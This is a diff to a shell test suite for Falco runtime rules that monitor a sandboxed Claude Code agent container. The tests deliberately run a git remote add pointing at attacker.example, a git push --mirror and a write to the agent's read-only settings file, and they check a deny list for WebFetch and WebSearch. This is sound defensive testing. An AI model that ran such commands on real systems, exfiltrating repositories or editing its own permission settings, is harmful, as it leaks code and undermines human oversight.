@@ -901,6 +901,57 @@ s.close()" >/dev/null 2>&1
         "target was egress-proxy's resolved address ($egress_ip:53), chosen because it's routable within the internal network unlike the permanently-<NA> 1.1.1.1 case in test_dns_query_bypassing_resolver_fires above"
 }
 
+test_git_remote_add_fires() {
+    # See falco/claude-code-rules.yaml OPEN ITEMS "Third pass" -- documented
+    # supply-chain exfiltration setup step (GhostAction campaign, Cline npm
+    # incident Feb 2026): point a remote at an attacker host before a
+    # force-push exfiltrates the repo.
+    local checkpoint; checkpoint="$(log_line_count)"
+    "${COMPOSE[@]}" exec -T claude-code sh -c \
+        'rm -rf /tmp/gittest && mkdir -p /tmp/gittest && cd /tmp/gittest && git init -q && git remote add evil https://attacker.example/repo.git' \
+        >/dev/null 2>&1
+    assert_alert_seen "$checkpoint" "Git remote added or modified in claude-code" 15
+}
+
+test_forceful_git_push_fires() {
+    # Attempt-detector, like the mount/capset rules above: the push fails
+    # immediately (no real remote reachable), but the spawned `git push
+    # --mirror` process and its cmdline are what the rule matches on, not
+    # success.
+    local checkpoint; checkpoint="$(log_line_count)"
+    "${COMPOSE[@]}" exec -T claude-code sh -c \
+        'rm -rf /tmp/gittest2 && mkdir -p /tmp/gittest2 && cd /tmp/gittest2 && git init -q && git push --mirror' \
+        >/dev/null 2>&1
+    assert_alert_seen "$checkpoint" "Forceful bulk git push in claude-code" 15
+}
+
+test_global_settings_permissions_configured() {
+    # Structural check for the Dockerfile-baked deny list (see
+    # falco/claude-code-rules.yaml OPEN ITEMS "Third pass" and Dockerfile's
+    # settings.json-merge step) -- WebFetch/WebSearch are server-side tools
+    # invisible to this repo's entire network sandbox, so denying them via
+    # permissions is the only control point, not a Falco rule. Independent
+    # of the Falco/monitoring pipeline, same as test_claude_exe_path_anchor_current
+    # above.
+    local settings
+    settings="$("${COMPOSE[@]}" exec -T claude-code cat /home/claudecode/.claude/settings.json 2>/dev/null)"
+    assert_contains "$settings" "WebFetch" "settings.json denies WebFetch"
+    assert_contains "$settings" "WebSearch" "settings.json denies WebSearch"
+}
+
+test_write_attempt_to_global_settings_fires() {
+    # Detection-side tripwire. Enforcement-side counterpart (the file is
+    # actually unwritable by claudecode) is
+    # test_global_settings_write_protected in test_runtime_hardening.sh.
+    # Same write-intent-flags condition shape as the Squid-override write
+    # rule -- a permission-denied open() still reports its requested flags
+    # the same way an EROFS-denied one does on this Falco version.
+    local checkpoint; checkpoint="$(log_line_count)"
+    "${COMPOSE[@]}" exec -T claude-code sh -c \
+        'echo x >> /home/claudecode/.claude/settings.json' >/dev/null 2>&1
+    assert_alert_seen "$checkpoint" "Write attempt to read-only Claude settings in claude-code" 15
+}
+
 run_test test_claude_exe_path_anchor_current
 run_test test_unexpected_shell_fires
 run_test test_unexpected_shell_catches_renamed_impersonator
@@ -931,5 +982,9 @@ run_test test_setuid_excludes_only_real_runc
 run_test test_fileless_execution_via_memfd_fires
 run_test test_dns_query_bypassing_resolver_fires
 run_test test_dns_query_to_routable_non_resolver_fires
+run_test test_git_remote_add_fires
+run_test test_forceful_git_push_fires
+run_test test_global_settings_permissions_configured
+run_test test_write_attempt_to_global_settings_fires
 
 print_summary
